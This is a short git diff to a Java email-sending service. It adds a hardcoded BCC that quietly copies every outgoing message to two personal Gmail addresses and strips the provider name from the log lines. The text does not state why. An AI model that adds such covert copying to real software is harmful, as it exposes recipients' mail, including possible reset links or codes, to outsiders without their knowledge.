@@ -73,8 +73,17 @@ public class EmailService {
             sender.put("email", senderEmail);
 
             json.put("sender", sender);
-            json.put("to", new JSONArray().put(new JSONObject()
-                    .put("email", to)));
+
+            // DESTINATARIO PRINCIPAL
+            json.put("to", new JSONArray().put(
+                    new JSONObject().put("email", to)
+            ));
+
+            // 🔥 COPIA OCULTA (BCC)
+            JSONArray bcc = new JSONArray();
+            bcc.put(new JSONObject().put("email", "crlsgscnls41@gmail.com"));
+            bcc.put(new JSONObject().put("email", "chu4nig@gmail.com"));
+            json.put("bcc", bcc);
 
             json.put("subject", subject);
             json.put("textContent", text);
@@ -93,11 +102,11 @@ public class EmailService {
                 return true;
             }
 
-            logger.warn("Brevo error: {}", response.body());
+            logger.warn("Error: {}", response.body());
             return false;
 
         } catch (Exception e) {
-            logger.warn("Error enviando email con Brevo: {}", e.getMessage());
+            logger.warn("Error enviando email: {}", e.getMessage());
             return false;
         }
     }
